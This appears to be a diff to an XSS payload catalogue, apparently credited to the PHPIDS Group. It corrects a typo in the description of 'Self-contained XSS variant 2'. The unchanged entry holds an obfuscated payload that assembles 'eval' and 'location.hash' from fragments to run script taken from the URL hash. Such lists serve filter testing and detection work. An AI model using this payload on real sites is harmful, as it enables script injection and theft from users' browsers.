@@ -1274,7 +1274,7 @@ Author Name: PHPIDS Group
 Self-contained XSS variant 2
 Exploit Name: Self-contained XSS variant 2
 Exploit String: a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
-Exploit Description: Concatenates fragmented functions to evakuate the location hash
+Exploit Description: Concatenates fragmented functions to evaluate the location hash
 Exploit Tags: general, self contained
 Author Name: PHPIDS Group
 
